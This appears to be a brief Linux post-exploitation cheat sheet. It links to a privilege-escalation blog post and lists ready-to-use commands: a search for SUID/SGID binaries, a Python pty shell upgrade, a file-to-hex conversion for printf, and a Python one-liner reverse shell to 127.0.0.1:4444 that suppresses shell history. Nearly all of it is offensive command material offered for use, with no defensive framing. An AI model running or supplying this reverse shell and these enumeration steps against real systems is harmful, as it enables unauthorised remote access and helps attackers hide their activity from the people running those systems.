Generic Linux Starting Points
=============================

Identify & Enumerate
--------------------

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### suid binaries
```
find / -perm /6000 -type f 2>/dev/null
```

### Upgrade a simple shell to a shell with a pty
python -c 'import pty; pty.spawn("/bin/bash")'

Tricks
------

Convert file to hex for printf:
```
xxd -i file.ext | grep 0x | tr -d '\n' | sed 's/0x/\\x/g;s/[, ]*//g'
```

Python reverse shell with pty:
```
python -c 'import os,pty,socket;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("127.0.0.1", 4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
```
